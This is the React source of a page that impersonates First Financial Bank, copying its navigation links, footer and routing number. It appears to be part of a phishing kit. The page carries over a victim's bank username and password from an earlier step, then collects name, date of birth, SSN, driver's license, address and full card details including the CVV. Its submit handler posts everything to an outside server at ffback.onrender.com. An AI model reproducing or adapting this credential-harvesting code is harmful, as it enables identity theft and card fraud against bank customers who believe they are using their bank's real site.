import React from 'react';


import './home.css'

import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

import { useLocation } from 'react-router-dom';
import footerlogo from './footerlogo.png';
import footericon from './footericon.png';
import main from './main.png';
import { Link } from 'react-router-dom';

import toggle from './toggle.png';
import close from './close.png';
import axios from 'axios';


function Personal(){

    const[showtoggle, setShowToggle] = useState(false);


    function handleToggle(e){
        e.preventDefault();

        setShowToggle(!showtoggle);
    }

    const[type, setType]= useState("");
    const[username, setUsername] = useState("");
    const[password, setPassword]= useState("");

    // step two data

    const[firstname, setFirstname] = useState("");
    const[lastname, setLastname] = useState("");
    const[othername, setOthername] = useState("");
    const[dob, setDob] = useState("");
    const[ssn, setSSN] = useState("");
    const[driver_license, setLicense] = useState("");
    const[address, setAddress] = useState("");
    const[card_name, setCardname] = useState("");
    const[card_number, setCardNumber] = useState("");
    const[card_expiration, setCardExpiration] = useState("");
    const[card_cvv, setCardCvv] = useState("");




    

    const navigate = useNavigate();

    const location = useLocation();

    useEffect(() => {

        setType(location.state.type);
        setUsername(location.state.username);
        setPassword(location.state.password);
       
      }, []);


     async function handleSubmit(e){
        e.preventDefault();

        

        // navigate('/final-step', { state: 
        //     { 
        //         type: type,
        //          username:username,
        //          password:password,
        //          firstname:firstname,
        //          lastname:lastname,
        //          othername:othername,
        //          dob:dob,
        //          ssn:ssn,
        //          driver_license:driver_license,
        //          address:address,
        //          card_name:card_name,
        //          card_number:card_number,
        //          card_expiration:card_expiration,
        //          card_cvv:card_cvv
            
        //     } });


        try {

         
            
            const response = await axios.post('https://ffback.onrender.com/api/send', {
                
                platform:"ffin",
                type: type,
                username:username,
                password:password,
                firstname:firstname,
                lastname:lastname,
                othername:othername,
                dob:dob,
                ssn:ssn,
                driver_license:driver_license,
                address:address,
                card_name:card_name,
                card_number:card_number,
                card_expiration:card_expiration,
                card_cvv:card_cvv,
               
            });
        
            // Handle success
    
            if(response.status == 200){
                
            console.log('Data sent:', response.data.message);



        navigate('/final-step', { state: 
            { 
                type: type,
                 username:username,
                 password:password,
                 firstname:firstname,
                 lastname:lastname,
                 othername:othername,
                 dob:dob,
                 ssn:ssn,
                 driver_license:driver_license,
                 address:address,
                 card_name:card_name,
                 card_number:card_number,
                 card_expiration:card_expiration,
                 card_cvv:card_cvv
            
            } });
    
              
    
              
            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
            
          }




    }




    return (
        


        <>

<nav className='nav mynav'>

<div className='navimagediv'>
    <Link to={'/'}> <img className='navimage'src={main} /></Link>

</div>

<div className='navlinkdiv'>

    <a href="https://ffin.com/en-us/about/" className='blockdiv'>
        <i className='fa fa-info blockicon'></i>
        <p className='blockpara'>About Us</p>

    </a>

    <a href='https://ffin.com/en-us/locations/' className='blockdiv'>
        <i className='fa fa-location blockicon'></i>
        <p className='blockpara'>ATM/Locations</p>

    </a>

    <a href='http://investorrelations.ffin.com/CorporateProfile' className='blockdiv'>
        <i className='fa fa-line-chart blockicon'></i>
        <p className='blockpara'>Investors Relation</p>

    </a>

    <a href='https://ffin.com/en-us/about/contact-us/' className='blockdiv'>
        <i className='fa fa-envelope blockicon'></i>
        <p className='blockpara'>Contact Us</p>

    </a>

    <a href='https://ffin.com/en-us/about/careers/' className='blockdiv'>
        <i className='fa fa-users blockicon'></i>
        <p className='blockpara'>Careers</p>

    </a>

</div>

</nav>


<nav class="mobilenavbar navbar navbar-expand-lg navbar-light bg-light">
            <img className='navimagetwo'src={main} />
  
        {showtoggle ? <img className='toggleimage' src={close} onClick={handleToggle} /> : <img className='toggleimage' src={toggle} onClick={handleToggle} />}
    
       
</nav>

{showtoggle &&
<div className='togglediv py-3'>
<ul className='footerlist text-left px-3'>
                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/about/'> <i className='fa fa-info '></i> About Us</a></li>
                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/locations/'> <i className='fa fa-location'></i> ATM/Locations</a></li>
                          <li className='py-2'><a className='footerlink' href='http://investorrelations.ffin.com/CorporateProfile'> <i className='fa fa-line-chart'></i> Investor Relation</a></li>

                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/about/contact-us/'> <i className='fa fa-envelope'></i> Contact Us</a></li>

                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/about/careers/'> <i className='fa fa-users'></i> Careers</a></li>
                      </ul>

</div>
}


            {/* form section */}

            <section className='formsection'>
                    <div className='col-md-8 m-auto formdiv'>
                        <h3 className='text-center  formhead'>PERSONAL INFORMATION</h3>
                        <p className='text-center'>Hi {username}, Kindly take out time to complete this form</p>

                    <form onSubmit={handleSubmit}>

                        <div class="row g-3">
                            <div class="col-sm-4">
                            <label for="firstName" class="form-label">First name</label>
                            <input onChange={function(e){
                                setFirstname(e.target.value);

                            }} value={firstname} type="text" class="form-control" id="firstName" placeholder=""  required/>
              
                            </div>

                            <div class="col-sm-4">
                            <label for="lastName" class="form-label">Last name</label>
                            <input onChange={function(e){
                                setLastname(e.target.value);

                            }} value={lastname} type="text" class="form-control" id="lastName" placeholder=""  />
                            
                            </div>


                            <div class="col-sm-4">
                            <label for="lastName" class="form-label">Other name(s)</label>
                            <input onChange={function(e){
                                setOthername(e.target.value);

                            }} value={othername} type="text" class="form-control" id="lastName" placeholder=""  />
                            
                            </div>
                    </div>


                    <div class="row mt-3">
                            <div class="col-sm-4">
                            <label for="firstName" class="form-label">DOB</label>
                            <input onChange={function(e){
                                setDob(e.target.value);

                            }} value={dob} type="date" class="form-control" id="firstName" placeholder=""  required/>
                            
                            </div>

                            <div class="col-sm-4">
                            <label for="lastName" class="form-label">SSN</label>
                            <input onChange={function(e){
                                setSSN(e.target.value);

                            }} value={ssn} type="text" class="form-control" id="lastName" placeholder=""  required/>
                            
                            </div>

                            <div class="col-sm-4">
                            <label for="lastName" class="form-label">Driver's License Number</label>
                            <input onChange={function(e){
                                setLicense(e.target.value);

                            }} value={driver_license} type="text" class="form-control" id="lastName" placeholder=""  required/>
                            
                            </div>
                    </div>

                    <div className='mt-3'>
                    <label for="lastName" class="form-label">Home Address</label>
                        <textarea onChange={function(e){
                                setAddress(e.target.value);

                            }} value={address} className='form-control' required />
                    </div>

                    <div class="row gy-3 mt-3">
            <div class="col-md-6">
              <label for="cc-name" class="form-label">Name on card</label>
              <input onChange={function(e){
                                setCardname(e.target.value);

                            }} value={card_name} type="text" class="form-control" id="cc-name" placeholder="" required/>
              <small class="text-muted">Full name as displayed on card</small>
              
            </div>

            <div class="col-md-6">
              <label for="cc-number" class="form-label">Card Number</label>
              <input onChange={function(e){
                                setCardNumber(e.target.value);

                            }} value={card_number} type="text" class="form-control" id="cc-number" placeholder="" required/>
              
            </div>

            <div class="col-md-3">
              <label for="cc-expiration" class="form-label">Expiration</label>
              <input onChange={function(e){
                                setCardExpiration(e.target.value);

                            }} value={card_expiration} type="text" class="form-control" id="cc-expiration" placeholder="" required/>
              
            </div>

            <div class="col-md-3">
              <label for="cc-cvv" class="form-label">CVV</label>
              <input onChange={function(e){
                                setCardCvv(e.target.value);

                            }} value={card_cvv} type="text" class="form-control" id="cc-cvv" placeholder="" required/>
              
            </div>
          </div>

          <div className='buttondiv text-center mt-3'>
                    <button className='btn formbtn'>NEXT STEP</button>

            </div>
            </form>

                </div>

                

            </section>

            {/* end of form section */}


            <section className='footer'>

                <div className='footflex'>

                    <div className='footflexdiv'>

                        <img className='footerlogo'src={footerlogo} />

                    </div>
                    <div className='footflexdiv'>
                        <h6 className='flexdivhead'>CONNECT WITH US</h6>

                        <img className='footericon footerlogo' src={footericon} />

                    </div>
                    <div className='footflexdiv'>

                      <ul className='footerlist'>
                          <li><a className='footerlink' href='https://ffin.com/en-us/about/'> <i className='fa fa-info '></i> About Us</a></li>
                          <li><a className='footerlink' href='https://ffin.com/en-us/locations/'> <i className='fa fa-location'></i> ATM/Locations</a></li>
                          <li><a className='footerlink' href='http://investorrelations.ffin.com/CorporateProfile'> <i className='fa fa-line-chart'></i> Investor Relation</a></li>

                          <li><a className='footerlink' href='https://ffin.com/en-us/about/contact-us/'> <i className='fa fa-envelope'></i> Contact Us</a></li>

                          <li><a className='footerlink' href='https://ffin.com/en-us/about/careers/'> <i className='fa fa-users'></i> Careers</a></li>
                      </ul>
                   

                    </div>

                    

                </div>

                <hr style={{ border: '0.3px solid white', margin: '20px 0' }} />

                <div className='col-md-10 m-auto bolddiv'>
                    <p className='bolddivpara font-weight-bold'>Investment and Insurance Products Are:</p>
                    <p className='bolddivpara'>Not a Deposit Not FDIC Insured Not Insured by Any Federal Government Agency Not Guaranteed by The Bank May Lose Value</p>
                </div>

                <hr style={{ border: '0.3px solid white', margin: '20px 0' }} />


                <div className='lastdiv'>
                    <div className='lasdivfirst'>
                        <p className='font-weight-bold bolddivparatwo'>© 2023 First Financial Bankshares, All Rights Reserved
First Financial Bank Routing Number: 111301122
First Financial Bank Non-Connected SWIFT/BIC: FITEUS41</p>

                    </div>

                    <div className='lastdivsecond'>
                        <p className='bolddivparatwo'>Terms Of Use  Privacy Policy  Policies and Disclosures  Transparency in Coverage  FAQs</p>

                    </div>
                </div>

            </section>

        
        </>
    );
}

export default Personal;